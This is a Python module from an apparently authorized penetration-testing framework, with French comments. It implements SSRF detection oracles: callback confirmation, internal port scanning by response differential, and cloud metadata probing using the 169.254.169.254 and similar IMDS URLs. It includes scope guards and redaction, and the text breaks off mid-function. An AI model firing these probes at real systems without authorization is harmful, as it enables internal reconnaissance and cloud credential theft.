# SPDX-License-Identifier: AGPL-3.0-or-later
"""ssrf.callback — oracle SSRF à PREUVE par callback VÉRIFIÉ (T1190 / CWE-918).

Le SSRF aveugle est la plaie des rapports rejetés : « le serveur a peut-être fait une requête » n'est
PAS une preuve. Cet oracle inverse la charge : il n'élève en `vulnerable` QUE si un callback unique
(token aléatoire-mais-déterministe par cible) a RÉELLEMENT été reçu côté serveur de collecte. Sans
preuve de réception -> `tested` (jamais `vulnerable` à l'aveugle).

Mécanique :
  1. injecte une URL de callback `{base}/{token}` dans le paramètre vulnérable (params.param) de la cible ;
  2. interroge un collecteur de callbacks (params.callback_check_url, un endpoint qui répond
     200 + corps contenant le token si la requête SSRF est bien arrivée — interactsh-like, webhook,
     ou stub de test) ;
  3. PREUVE = le collecteur a vu le token -> `vulnerable`. Sinon -> `tested`.

exploit=True (fait émettre une requête sortante par la cible vers une infra contrôlée) -> exige
allow_exploit. destructive=False (aucune mutation d'état côté cible). web_allowed via le ROE (réseau).
Pur urllib (stdlib) ; aucun callback => jamais de verdict aveugle. Bâti sur la base `Oracle`
(construction Finding + câblage HTTP + curl partagés).
"""
import ipaddress
import re
import time
import urllib.parse

from .oracle import Oracle, ScopeGuardedOracle
from .registry import register
from .access_control import _body_hash
from ..roe import Scope
from .. import techniques


@register("ssrf.callback")
class SsrfCallback(Oracle):
    kind = "ssrf.callback"
    exploit = True                       # provoque une requête sortante de la cible -> allow_exploit
    destructive = False                  # aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("ssrf.callback")   # source de vérité : forge/techniques.py (T1190)
    cwe = "CWE-918"                      # category + cwe des findings (via Oracle.proof/skip)
    tool = "forge/modules/ssrf.py:ssrf.callback"
    MAXLEN = 100000                      # troncature du corps lu (cf. Oracle._fetch_body)
    fix = ("Allowlist stricte des hôtes/schemas autorisés côté serveur ; bloquer les IP internes "
           "(RFC1918, loopback, link-local) et les endpoints de métadonnées cloud "
           "(169.254.169.254, metadata.google.internal) ; résoudre puis re-valider l'IP avant la "
           "connexion (anti-DNS-rebinding) et désactiver le suivi des redirections.")
    description = ("Oracle SSRF à PREUVE : injecte une URL de callback unique et confirme la "
                  "réception côté collecteur. Pas de callback reçu -> tested (jamais vuln aveugle). CWE-918.")

    @staticmethod
    def _token(target, param):
        """Jeton déterministe-par-cible (reproductible, pas de random non rejouable), assez unique
        pour distinguer ce test d'autres callbacks parasites côté collecteur."""
        import hashlib
        return "forge" + hashlib.sha1(f"{target}|{param}".encode()).hexdigest()[:16]

    def _payload_url(self, action):
        base = str(action.params.get("callback_base", "")).rstrip("/")
        token = self._token(action.target, action.params.get("param", ""))
        return f"{base}/{token}", token

    def dry(self, action):
        param = action.params.get("param", "?")
        cb, token = self._payload_url(action)
        return (f"# injecte {param}={cb} dans {action.target} ; "
                f"puis GET {action.params.get('callback_check_url', '<collecteur>')} et cherche le token "
                f"{token} — PREUVE = token reçu côté serveur (sinon tested, jamais vuln aveugle)")

    def fire(self, action):
        param = action.params.get("param")
        check_url = action.params.get("callback_check_url")
        if not param or not action.params.get("callback_base") or not check_url:
            return [self.skip(
                target=action.target, title="SSRF non testé — config manquante",
                evidence=("Requiert params.param (paramètre injectable), params.callback_base "
                          "(URL du collecteur contrôlé) et params.callback_check_url (endpoint qui "
                          "atteste la réception du token)."),
                poc=self.dry(action))]
        cb_url, token = self._payload_url(action)
        method = str(action.params.get("method", "GET")).upper()
        headers = action.params.get("headers", {})
        # 1) injecter l'URL de callback dans le paramètre vulnérable
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            inj = f"{action.target}{sep}{urllib.parse.urlencode({param: cb_url})}"
            i_st, _i_body = self._fetch(inj, headers=headers, method="GET")
        else:
            inj = action.target
            i_st, _i_body = self._fetch(inj, headers=headers, method=method,
                                        data=urllib.parse.urlencode({param: cb_url}))
        # 2) interroger le collecteur — la PREUVE est ici, pas dans la réponse de la cible
        cs, cbody = self._fetch(check_url, timeout=action.params.get("callback_timeout", 15))
        # AUCUN VERDICT sans les DEUX jambes. Un collecteur MUET ne dit rien sur la réception du
        # callback : il n'a pas été interrogé. Et le statut de l'injection était jeté — une injection
        # jamais partie suivie d'un collecteur vide produisait « aucun callback reçu », parfaitement
        # crédible. C'est la seule preuve out-of-band du catalogue : elle ne tolère pas l'à-peu-près.
        if i_st is None or cs is None:
            return [self.degraded(
                target=inj,
                title="SSRF non testé — injection ou collecteur injoignable (aucune réponse)",
                evidence=(f"cible={i_st} collecteur={cs} : au moins une jambe n'a pas répondu ; "
                          f"l'absence de callback OBSERVÉ n'est pas l'absence de SSRF."),
                poc=self.dry(action))]
        received = (cs == 200 and token in (cbody or ""))
        return [self.proof(
            target=inj, proven=received,
            title=("SSRF CONFIRMÉ — callback reçu côté serveur (preuve out-of-band)"
                   if received else "SSRF non confirmé — aucun callback reçu (pas de verdict aveugle)"),
            severity=("HIGH" if received else "INFO"),
            evidence=(f"injection {param}={cb_url} ; collecteur HTTP {cs} ; token_reçu={received} "
                      f"(token={token})"),
            poc=(f"# 1) {self._curl(inj, headers, method, None if method == 'GET' else param + '=' + cb_url)}\n"
                 f"# 2) curl -sS '{check_url}'  # chercher le token {token}"))]


# =================================================================================================
#  ssrf.xspa — variante SSRF PORT-SCAN (XSPA) à PREUVE DIFFÉRENTIELLE, CONTRE LA CIBLE IN-SCOPE
#  UNIQUEMENT (T1190 / CWE-918) — informatif / proof-minimal, NON DESTRUCTIF (aucun tiers, aucune infra
#  attaquant). On sonde la JOIGNABILITÉ de ports INTERNES via un paramètre SSRF-able en observant un
#  DIFFÉRENTIEL de réponse (statut + corps NEUTRALISÉ du reflet) et de timing entre un port et une
#  baseline « fermée ». Le différentiel neutralise le REFLET de l'URL injectée (sinon un simple echo du
#  marqueur passerait pour une joignabilité) : seule une différence de CONTENU réel (service vs refus)
#  ou de STATUT vaut preuve. Aucune donnée sensible, aucune requête vers une infra hors périmètre.
# =================================================================================================
_XSPA_DEFAULT_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
# =================================================================================================
#  DEUX baselines « fermées », et des ports HAUTS — les deux corrigent le MÊME défaut mesuré.
#
#  MESURÉ (banc de détection, `docs/BENCH_DETECTION.md` § D5) : **3 MEDIUM `vulnerable` FAUX** sur
#  VAmPI, déclarant JOIGNABLES les 10 ports `[22,80,443,3306,5432,6379,8080,8443,9200,27017]` —
#  9 sur 10 FERMÉS (connexion TCP directe), et l'endpoint pas SSRF-able du tout : corps IDENTIQUE de
#  1 563 octets pour `__debugger__=…:1/` et `…:3306/`.
#
#  CAUSE EXACTE, VÉRIFIÉE (ce n'est PAS le timing — le timing est mesuré mais n'entre dans AUCUN
#  verdict : seul `sig != closed_sig` promeut). La baseline « fermée » était le port **1**, et la
#  neutralisation du reflet scrubait le NUMÉRO DE PORT du corps, port par port :
#
#      re.sub(r"(?<!\d)1(?!\d)", "<PORT>", body)      # baseline : mange TOUS les « 1 » isolés
#      re.sub(r"(?<!\d)3306(?!\d)", "<PORT>", body)   # port     : no-op (3306 absent du corps)
#
#  Sur un corps HTML quelconque (`HTTP/1.1`, `version 1.0.1`, `console-1`) le corps de la BASELINE est
#  donc mutilé et celui des ports ne l'est pas : deux corps OCTET POUR OCTET IDENTIQUES produisent
#  deux signatures DIFFÉRENTES. La neutralisation censée SUPPRIMER le faux signal le FABRIQUAIT — et
#  de façon inconditionnelle, d'où « 10 ports sur 10 joignables ».
#
#  TROIS CORRECTIFS, chacun visant une marche de l'escalier :
#    (1) SCRUB SYMÉTRIQUE — tous les corps sont normalisés avec le MÊME jeu d'URL et de ports (cf.
#        `_sig`). Corps identiques -> signatures identiques, par construction.
#    (2) BASELINES HAUTES — un port à 5 chiffres n'apparaît pas par hasard dans un corps, là où « 1 »
#        y est partout : le scrub ne peut plus détruire un différentiel RÉEL au passage.
#    (3) DEUX baselines fermées DISTINCTES — contrôle négatif : deux ports tous deux FERMÉS doivent
#        rendre la MÊME signature. S'ils diffèrent, le canal est instable (horodatage, nonce, CSRF,
#        équilibrage) et TOUT différentiel par-port y est ininterprétable -> abstention.
# =================================================================================================
_XSPA_CLOSED_PORTS = (47119, 47123)      # 2 ports hauts quasi-toujours fermés -> baseline + contrôle négatif
_XSPA_CLOSED_PORT = _XSPA_CLOSED_PORTS[0]        # compat : baseline « closed » historique (1re des deux)
_XSPA_MAX_PORTS = 40                     # borne (politesse / rate) — jamais un scan massif


@register("ssrf.xspa")
class SsrfXspa(ScopeGuardedOracle):
    kind = "ssrf.xspa"
    exploit = False                      # sonde différentielle informative (aucune infra attaquant) -> non-exploit
    destructive = False                  # lecture/observation seule : aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("ssrf.xspa")            # source de vérité : techniques.py (T1190)
    cwe = "CWE-918"                                       # category + cwe des findings
    tool = "forge/modules/ssrf.py:ssrf.xspa"
    MAXLEN = 100000                                       # troncature du corps lu (cf. Oracle._fetch_body)
    fix = ("Allowlist stricte des hôtes/schemas autorisés côté serveur ; bloquer les IP internes "
           "(RFC1918, loopback, link-local) et les ports internes non nécessaires ; résoudre puis "
           "re-valider l'IP (anti-DNS-rebinding) et interdire les schémas/ports arbitraires fournis par "
           "le client — un fetch côté serveur ne doit jamais devenir un scanner de ports interne (CWE-918).")
    description = ("Oracle XSPA (SSRF port-scan) à PREUVE DIFFÉRENTIELLE contre la cible IN-SCOPE "
                   "uniquement : joignabilité de ports internes via différentiel de réponse vs DEUX "
                   "baselines fermées (reflet neutralisé symétriquement ; contrôle négatif). Réponse qui "
                   "ne varie pas selon l'URL injectée -> skipped. Informatif, non destructif. CWE-918.")

    def _internal_host(self, action):
        """Hôte à port-scanner : params.internal_host (déclaré par l'opérateur) OU, par défaut, l'HÔTE
        de la cible IN-SCOPE elle-même (on sonde le target via SA PROPRE SSRF — jamais un tiers)."""
        h = action.params.get("internal_host")
        return str(h) if h else Scope._host(action.target)

    @staticmethod
    def _is_loopback(host):
        """True si `host` est une interface LOOPBACK de la cible (localhost / 127.0.0.0/8 / ::1) — ses
        propres ports internes, cœur de XSPA. Pur, ne lève jamais."""
        h = str(host).strip().lower().strip("[]")
        if h in ("localhost", "ip6-localhost"):
            return True
        try:
            return ipaddress.ip_address(h).is_loopback
        except ValueError:
            return False

    def _internal_host_allowed(self, action, host):
        """Garde-fou « against the in-scope target only » : l'hôte port-scanné doit être une interface
        LOOPBACK de la cible OU un hôte IN-SCOPE du périmètre. Tout tiers PUBLIC hors périmètre est
        REFUSÉ (jamais de weaponization de la SSRF pour scanner un tiers). Fail-closed."""
        return self._is_loopback(host) or self._in_scope(action, host)

    def _inject(self, action, param, internal_url, method, headers, timeout):
        """Injecte l'URL interne dans le paramètre SSRF-able et renvoie (status, body). GET -> query ;
        autre méthode -> corps urlencodé. NOUS ne requêtons que action.target (in-scope) ; l'URL interne
        est fetchée PAR LE SERVEUR, jamais par nous."""
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            url = f"{action.target}{sep}{urllib.parse.urlencode({param: internal_url})}"
            return self._fetch(url, headers=headers, method="GET", timeout=timeout)
        return self._fetch(action.target, headers=headers, method=method,
                           data=urllib.parse.urlencode({param: internal_url}), timeout=timeout)

    @staticmethod
    def _sig(st, body, internal_urls, ports, internal_host):
        """Signature de réponse RÉFLEXION-NEUTRALISÉE et **SYMÉTRIQUE** : (statut, hash du corps
        normalisé). Neutraliser le reflet évite qu'un simple echo du marqueur (URL/port distincts par
        requête) passe pour un état de port ; seul un CONTENU réel différent (service vs refus) ou un
        STATUT différent subsiste -> preuve robuste.

        SYMÉTRIQUE — le point qui a coûté 3 faux MEDIUM (cf. le bloc de doctrine ci-dessus). `internal_urls`
        et `ports` portent le jeu COMPLET de la campagne (baselines + tous les ports sondés), pas seulement
        celui de la requête courante : CHAQUE corps subit donc EXACTEMENT la même normalisation. Deux corps
        identiques rendent alors des signatures identiques — invariant que l'ancienne version, qui scrubait
        le seul port de la requête, violait sur n'importe quel corps contenant le chiffre de la baseline.

        Les ports sont scrubés du PLUS LONG au plus court : un `re.sub` sur `80` ne doit pas amputer `8080`
        déjà remplacé (l'ordre était indifférent tant qu'un seul port était traité ; il ne l'est plus)."""
        b = body or ""
        for u in sorted({str(u) for u in (internal_urls or ())}, key=len, reverse=True):
            b = b.replace(u, "<INJ>")
        plist = sorted({int(p) for p in (ports or ())}, reverse=True)
        for p in plist:
            b = b.replace(f"{internal_host}:{p}", "<HP>")
        for p in plist:
            b = re.sub(r"(?<!\d)" + re.escape(str(p)) + r"(?!\d)", "<PORT>", b)
        return (st, _body_hash(b))

    # --- LES DEUX CONTRÔLES NÉGATIFS, nommés séparément (chacun se teste et se mute isolément) ------
    @staticmethod
    def _channel_inert(responses):
        """Le canal porte-t-il de l'information ? FAUX ssi toutes les réponses (baselines + ports) sont
        identiques OCTET POUR OCTET. C'est le cas mesuré sur VAmPI : l'URL injectée n'a AUCUN effet
        observable, donc « paramètre non SSRF-able » et « tous les ports fermés » sont indistinguables.
        Pur, ne lève jamais."""
        return len(set(responses)) == 1

    @staticmethod
    def _baselines_agree(base_sigs):
        """Deux ports tous deux FERMÉS doivent être INDISCERNABLES. S'ils ne le sont pas, la réponse
        varie pour une raison étrangère à l'état du port (horodatage, nonce, CSRF, équilibrage) et tout
        différentiel par-port est ininterprétable. Pur, ne lève jamais."""
        return len(set(base_sigs)) == 1

    def dry(self, action):
        param = action.params.get("param", "?")
        host = self._internal_host(action)
        ports = [int(p) for p in (action.params.get("ports") or _XSPA_DEFAULT_PORTS)][:_XSPA_MAX_PORTS]
        return (f"# injecte {param}=http://{host}:<port>/ dans {action.target} pour {len(ports)} port(s) "
                f"INTERNES de la cible in-scope + DEUX baselines fermées {list(_XSPA_CLOSED_PORTS)} "
                f"(référence + contrôle négatif) ; PREUVE = un différentiel de réponse (reflet NEUTRALISÉ "
                f"SYMÉTRIQUEMENT) prouve la joignabilité interne ; réponse qui ne varie pas, ou deux "
                f"baselines fermées discordantes -> skipped (rien à mesurer) ; informatif, non destructif")

    def fire(self, action):
        # (1) SCOPE-GUARD fail-closed sur la cible SSRF-able — hors périmètre -> skipped, AUCUN réseau.
        if not self._in_scope(action, action.target):
            return [self._scope_refused(action)]
        param = action.params.get("param")
        if not param:
            return [self.skip(
                target=action.target, title="XSPA non testé — config manquante",
                evidence=("Requiert params.param (paramètre SSRF-able). Optionnel : params.internal_host "
                          "(défaut = hôte de la cible in-scope), params.ports, params.internal_scheme, "
                          "params.method, params.headers, params.port_timeout."),
                poc=self.dry(action))]
        method = str(action.params.get("method", "GET")).upper()
        headers = dict(action.params.get("headers", {}))
        internal_host = self._internal_host(action)
        # (1bis) « against the in-scope target only » : refuser un hôte tiers PUBLIC hors périmètre —
        # jamais weaponiser la SSRF pour scanner un tiers (fail-closed, ZÉRO I/O, aucune injection).
        if not self._internal_host_allowed(action, internal_host):
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — hôte interne hors périmètre (scope-guard fail-closed)",
                evidence=(f"L'hôte à port-scanner '{internal_host}' n'est ni une interface loopback de la "
                          f"cible ni in-scope : REFUSÉ (pas de scan de tiers). Aucune injection émise."),
                poc=self.dry(action))]
        scheme = str(action.params.get("internal_scheme", "http"))
        try:
            timeout = max(1, min(int(action.params.get("port_timeout") or 8), 30))
        except (TypeError, ValueError):
            timeout = 8
        try:
            ports = [int(p) for p in (action.params.get("ports") or _XSPA_DEFAULT_PORTS)][:_XSPA_MAX_PORTS]
        except (TypeError, ValueError):
            ports = list(_XSPA_DEFAULT_PORTS)

        # Jeu COMPLET (baselines + ports sondés) — il alimente la normalisation SYMÉTRIQUE de `_sig`.
        closed_ports = list(_XSPA_CLOSED_PORTS)
        all_ports = closed_ports + list(ports)
        all_urls = [f"{scheme}://{internal_host}:{p}/" for p in all_ports]

        def _probe_port(port):
            """(sig, statut, corps_brut, secondes) pour un port. Le corps BRUT est conservé : c'est lui
            qui répond à « la réponse varie-t-elle du tout ? », AVANT toute normalisation."""
            iu = f"{scheme}://{internal_host}:{port}/"
            t = time.monotonic()
            st, body = self._inject(action, param, iu, method, headers, timeout)
            el = time.monotonic() - t
            return self._sig(st, body, all_urls, all_ports, internal_host), st, body, el

        # DEUX baselines « fermées » (ports hauts improbables) : référence du différentiel + contrôle négatif.
        base_sigs, base_raw, base_notes = [], [], []
        cst, closed_el = None, 0.0
        for bp in closed_ports:
            sig, st, body, el = _probe_port(bp)
            base_sigs.append(sig)
            base_raw.append((st, body))
            base_notes.append(f"{bp}(HTTP {st},{round(el, 3)}s)")
            if cst is None:
                cst, closed_el = st, el
        closed_sig = base_sigs[0]

        reachable, seen_network, port_notes = [], any(s is not None for s, _ in base_raw), []
        port_raw = []
        for port in ports:
            sig, st, body, el = _probe_port(port)
            if st is not None:
                seen_network = True
            port_raw.append((st, body))
            differs = (sig != closed_sig)
            if differs:
                reachable.append(port)
            port_notes.append(f"{port}:{'diff' if differs else 'same'}(HTTP {st},{round(el, 3)}s)")

        # (5) DÉGRADATION GRACIEUSE : aucune réponse du tout (réseau indisponible) -> skipped (offline-safe).
        if not seen_network:
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du serveur (transport indisponible) sur la baseline ni les ports ; offline-safe.",
                poc=self.dry(action))]

        # =========================================================================================
        #  (5b) LE CANAL PORTE-T-IL SEULEMENT DE L'INFORMATION ? — deux contrôles négatifs, tous deux
        #  antérieurs au verdict. Un scan de ports par DIFFÉRENTIEL n'a de sens que si la réponse VARIE
        #  selon le port ; quand elle ne varie pas, il n'y a rien à mesurer — et « rien à mesurer » se
        #  dit `skipped` (« je n'ai pas pu vérifier »), JAMAIS `tested` (« j'ai vérifié, rien trouvé »)
        #  ni `vulnerable`. C'est le vocabulaire déjà en place (`Oracle.degraded`), pas un second
        #  mécanisme concurrent.
        # =========================================================================================
        # (i) PARAMÈTRE INERTE — toutes les réponses (baselines comprises) sont identiques OCTET POUR
        #     OCTET : l'URL injectée n'a AUCUN effet observable. C'est exactement le cas mesuré sur
        #     VAmPI (1 563 o identiques pour le port 1 et le port 3306). On ne peut pas distinguer
        #     « paramètre non SSRF-able » de « tous les ports fermés » -> on ne tranche pas.
        if self._channel_inert(base_raw + port_raw):
            st0, b0 = base_raw[0]
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — la réponse ne VARIE PAS selon l'URL injectée (rien à mesurer)",
                evidence=(f"cible={action.target} ; paramètre={param} ; hôte interne={internal_host} ; "
                          f"les {len(base_raw) + len(port_raw)} réponses (2 baselines fermées + "
                          f"{len(port_raw)} port(s)) sont IDENTIQUES octet pour octet (HTTP {st0}, "
                          f"{len(b0 or '')} o). Un scan par différentiel n'a de sens que si la réponse "
                          f"varie selon le port : un corps identique prouve l'inverse — le paramètre est "
                          f"INERTE (non SSRF-able) ou tous les ports sont fermés, et ces deux lectures "
                          f"sont INDISTINGUABLES depuis la réponse. `skipped` (« pas vérifié »), jamais "
                          f"`tested` ni `vulnerable`."),
                poc=self.dry(action))]
        # (ii) CANAL INSTABLE — les DEUX baselines fermées ne rendent pas la même signature. Deux ports
        #      tous deux fermés DOIVENT être indiscernables ; s'ils ne le sont pas, la réponse porte du
        #      bruit par-requête (horodatage, nonce, CSRF, équilibrage) et le différentiel par-port ne
        #      prouve rien. C'est le contrôle qui aurait à lui seul éteint le faux positif du banc.
        if not self._baselines_agree(base_sigs):
            return [self.degraded(
                target=action.target,
                title="XSPA non testé — deux ports FERMÉS ne rendent pas la même réponse (canal instable)",
                evidence=(f"cible={action.target} ; paramètre={param} ; hôte interne={internal_host} ; "
                          f"contrôle négatif sur deux baselines fermées distinctes {closed_ports} : "
                          f"{' '.join(base_notes)} -> signatures DIFFÉRENTES. Deux ports tous deux fermés "
                          f"doivent être indiscernables ; ils ne le sont pas, donc la réponse varie pour une "
                          f"raison ÉTRANGÈRE à l'état du port (horodatage/nonce/CSRF/équilibrage) et tout "
                          f"différentiel par-port est ININTERPRÉTABLE. `skipped` (« pas vérifié »), jamais "
                          f"`tested` ni `vulnerable` ; ports candidats non conclus={ports}."),
                poc=self.dry(action))]

        proven = bool(reachable)
        return [self.proof(
            target=action.target, proven=proven,
            title=("XSPA CONFIRMÉ — joignabilité de ports internes via SSRF (différentiel de réponse, "
                   "reflet neutralisé)" if proven
                   else "XSPA non confirmé — aucun différentiel port/baseline (pas de verdict aveugle)"),
            severity=("MEDIUM" if proven else "INFO"),   # divulgation de topologie interne : réel mais informatif
            evidence=(f"cible SSRF-able={action.target} ; hôte interne sondé={internal_host} (in-scope) ; "
                      f"baseline fermée=port {_XSPA_CLOSED_PORT} (HTTP {cst}, {round(closed_el, 3)}s) ; "
                      f"ports JOIGNABLES (différentiel)={reachable or 'aucun'} ; détail={' '.join(port_notes)[:600]} ; "
                      f"contrôle négatif PASSÉ : deux baselines fermées distinctes {list(_XSPA_CLOSED_PORTS)} "
                      f"rendent la MÊME signature ({' '.join(base_notes)}) et la réponse VARIE selon l'URL "
                      f"injectée (le canal porte de l'information) ; reflet de l'URL injectée NEUTRALISÉ de "
                      f"façon SYMÉTRIQUE sur tous les corps (echo seul != joignabilité ; le verdict ne "
                      f"dépend PAS du timing) ; sonde CONTRE la "
                      f"cible in-scope uniquement, non destructif, aucune donnée lue"),
            poc=(f"# injecter {param}=http://{internal_host}:<PORT>/ dans {action.target} et comparer la "
                 f"réponse (reflet neutralisé) / timing au port fermé {_XSPA_CLOSED_PORT} ; "
                 f"# PREUVE = différentiel prouvant la joignabilité interne (ports={reachable or '—'})"))]


# =================================================================================================
#  ssrf.cloud_metadata — SSRF vers les ENDPOINTS DE MÉTADONNÉES CLOUD (AWS/GCP/Azure IMDS) à PREUVE
#  BÉNIGNE (T1190 / CWE-918), scope-lockée, NON DESTRUCTIVE. On sonde via un paramètre SSRF-able de la
#  cible IN-SCOPE si le serveur atteint le service de métadonnées lien-local (169.254.169.254 /
#  metadata.google.internal) — deux canaux de PREUVE, chacun bénin :
#    (A) IN-BAND : la réponse REFLÈTE une SIGNATURE de contenu de métadonnées (ex `ami-id`, `azEnvironment`,
#        l'index GCP `instance/`+`project/`) — après NEUTRALISATION du reflet de l'URL injectée (un simple
#        echo de l'URL ne suffit jamais). On ne cible QUE les chemins INDEX/non-secrets ; toute valeur de
#        credential est RÉDIGÉE. PREUVE forte -> `vulnerable` CRITICAL (données de métadonnées atteintes).
#    (B) OUT-OF-BAND (collecteur) : comme ssrf.callback, on injecte une URL de callback UNIQUE et on
#        confirme sa réception côté collecteur contrôlé par l'opérateur. Réception = SSRF vers une URL
#        arbitraire CONFIRMÉE hors-bande (donc la plage lien-local des métadonnées est joignable) ->
#        `vulnerable` HIGH. Ce n'est PAS un « SSRF aveugle » : le collecteur a VU la requête (preuve concrète).
#  NOUS ne requêtons que `action.target` (in-scope) ; c'est le SERVEUR qui va chercher l'URL métadonnées/
#  collecteur — le scope-guard porte sur `action.target`. exploit=False (vérification bénigne : chemins
#  index non-secrets, valeurs rédigées), destructive=False.
# =================================================================================================
# (provider, url_metadata, (marqueurs de CONTENU distinctifs — jamais dans l'URL injectée), min_hits)
_METADATA_PROBES = [
    ("AWS", "http://169.254.169.254/latest/meta-data/",
     ("ami-id", "instance-id", "reservation-id", "security-groups", "public-keys", "instance-type",
      "local-ipv4", "iam/"), 2),
    ("GCP", "http://metadata.google.internal/computeMetadata/v1/",
     ("instance/", "project/", "cpuplatform", "machinetype", "serviceaccounts", "numericprojectid"), 2),
    ("GCP-linklocal", "http://169.254.169.254/computeMetadata/v1/",
     ("instance/", "project/", "cpuplatform", "machinetype", "serviceaccounts", "numericprojectid"), 2),
    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ("azenvironment", "vmid", "subscriptionid", "resourcegroupname", "osprofile"), 2),
    ("Alibaba", "http://100.100.200.200/latest/meta-data/",
     ("instance-id", "region-id", "zone-id", "image-id"), 2),
]
# valeurs de credential susceptibles d'apparaître dans une réponse de métadonnées -> RÉDIGÉES de l'evidence.
_META_SECRET_RX = re.compile(
    r'(?i)("?(?:accesskeyid|secretaccesskey|access_key|secret_key|token|sessiontoken|private_key|'
    r'client_secret)"?\s*[:=]\s*)"?[A-Za-z0-9._\-+/=]{6,}"?')


def _redact_metadata(body):
    """Masque toute valeur de credential d'une réponse de métadonnées (AccessKeyId/Token/private_key…).
    Pur, ne lève jamais : l'evidence prouve l'atteinte SANS restituer un credential."""
    return _META_SECRET_RX.sub(r'\1<redacted-credential>', str(body or ""))


@register("ssrf.cloud_metadata")
class SsrfCloudMetadata(ScopeGuardedOracle):
    kind = "ssrf.cloud_metadata"
    exploit = False                      # vérification bénigne (chemins index non-secrets, valeurs rédigées)
    destructive = False                  # lecture/observation seule : aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("ssrf.cloud_metadata")   # source de vérité : techniques.py (T1190)
    cwe = "CWE-918"                                        # category + cwe des findings
    tool = "forge/modules/ssrf.py:ssrf.cloud_metadata"
    MAXLEN = 100000                                        # troncature du corps lu (cf. Oracle._fetch_body)
    fix = ("Allowlist stricte des hôtes/schemas côté serveur ; BLOQUER la plage lien-local et les "
           "endpoints de métadonnées cloud (169.254.169.254, metadata.google.internal, 100.100.200.200) ; "
           "résoudre puis re-valider l'IP avant connexion (anti-DNS-rebinding), désactiver le suivi de "
           "redirection, et exiger IMDSv2 (jeton) côté AWS — un fetch côté serveur ne doit jamais pouvoir "
           "atteindre le service de métadonnées (CWE-918).")
    description = ("Oracle SSRF vers les métadonnées cloud (AWS/GCP/Azure IMDS) à PREUVE BÉNIGNE : "
                   "signature de contenu métadonnées in-band (reflet neutralisé, credential rédigé) OU "
                   "callback collecteur out-of-band confirmé. Scope-locké. Sinon tested. CWE-918.")

    @staticmethod
    def _token(target, param):
        """Jeton de callback déterministe-par-cible (reproductible, distinctif) — mirroir de ssrf.callback."""
        import hashlib
        return "forgemeta" + hashlib.sha1(f"{target}|{param}".encode()).hexdigest()[:16]

    def _inject(self, action, param, injected_url, method, headers, timeout):
        """Injecte `injected_url` dans le paramètre SSRF-able et renvoie (status, body). NOUS ne requêtons
        que action.target (in-scope) ; l'URL métadonnées/collecteur est fetchée PAR LE SERVEUR."""
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            url = f"{action.target}{sep}{urllib.parse.urlencode({param: injected_url})}"
            return self._fetch(url, headers=headers, method="GET", timeout=timeout)
        return self._fetch(action.target, headers=headers, method=method,
                           data=urllib.parse.urlencode({param: injected_url}), timeout=timeout)

    @staticmethod
    def _signature_hit(body, injected_url, markers, min_hits):
        """(True, [marqueurs vus]) si >= min_hits marqueurs de CONTENU métadonnées apparaissent dans le
        corps APRÈS NEUTRALISATION du reflet de l'URL injectée (un echo de l'URL ne compte jamais). Pur."""
        b = (body or "").replace(injected_url, "<INJ>")
        low = b.lower()
        seen = [m for m in markers if m in low]
        return (len(seen) >= min_hits), seen

    def dry(self, action):
        param = action.params.get("param", "?")
        return (f"# injecte {param}=http://169.254.169.254/… (AWS/GCP/Azure IMDS) dans {action.target} ; "
                f"PREUVE (A) in-band = signature de contenu métadonnées réfléchie (reflet NEUTRALISÉ, "
                f"credential RÉDIGÉ) OU (B) out-of-band = callback collecteur confirmé ; scope-locké, "
                f"bénin (chemins index non-secrets) ; sinon tested")

    def fire(self, action):
        # (1) SCOPE-GUARD fail-closed sur la cible SSRF-able — hors périmètre -> skipped, AUCUN réseau.
        if not self._in_scope(action, action.target):
            return [self._scope_refused(action)]
        param = action.params.get("param")
        if not param:
            return [self.skip(
                target=action.target, title="SSRF cloud-metadata non testé — config manquante",
                evidence=("Requiert params.param (paramètre SSRF-able). Optionnel : params.method, "
                          "params.headers, params.providers (sous-ensemble AWS/GCP/Azure/Alibaba), et "
                          "params.callback_base + params.callback_check_url (preuve out-of-band collecteur)."),
                poc=self.dry(action))]
        method = str(action.params.get("method", "GET")).upper()
        headers = dict(action.params.get("headers", {}))
        try:
            timeout = max(1, min(int(action.params.get("timeout") or 10), 30))
        except (TypeError, ValueError):
            timeout = 10
        providers = action.params.get("providers")
        probes = [p for p in _METADATA_PROBES
                  if (not providers or p[0].split("-")[0] in providers)]

        # --- (A) IN-BAND : signature de contenu métadonnées (reflet NEUTRALISÉ) ---
        seen_network, hits = False, []
        for prov, meta_url, markers, min_hits in probes:
            st, body = self._inject(action, param, meta_url, method, headers, timeout)
            if st is not None:
                seen_network = True
            ok, seen = self._signature_hit(body, meta_url, markers, min_hits)
            if ok:
                hits.append((prov, meta_url, seen, _redact_metadata(body)[:400]))
        if hits:
            prov, meta_url, seen, snippet = hits[0]
            return [self.proof(
                target=action.target, proven=True,
                title=f"SSRF cloud-metadata CONFIRMÉ — {prov} IMDS atteint (signature in-band, credential rédigé)",
                severity="CRITICAL",
                evidence=(f"cible SSRF-able={action.target} ; provider={prov} ; url_injectée={meta_url} ; "
                          f"marqueurs de contenu métadonnées (reflet NEUTRALISÉ)={seen} ; extrait RÉDIGÉ="
                          f"{snippet} ; chemin INDEX non-secret sondé, credential(s) RÉDIGÉ(S) ; non destructif"),
                poc=(f"# injecter {param}={meta_url} dans {action.target} ; "
                     f"# PREUVE = signature de contenu métadonnées {seen} dans la réponse (reflet neutralisé)"))]

        # --- (B) OUT-OF-BAND : callback collecteur (mirroir ssrf.callback) ---
        cb_base = action.params.get("callback_base")
        check_url = action.params.get("callback_check_url")
        if cb_base and check_url:
            token = self._token(action.target, param)
            cb_url = f"{str(cb_base).rstrip('/')}/{token}"
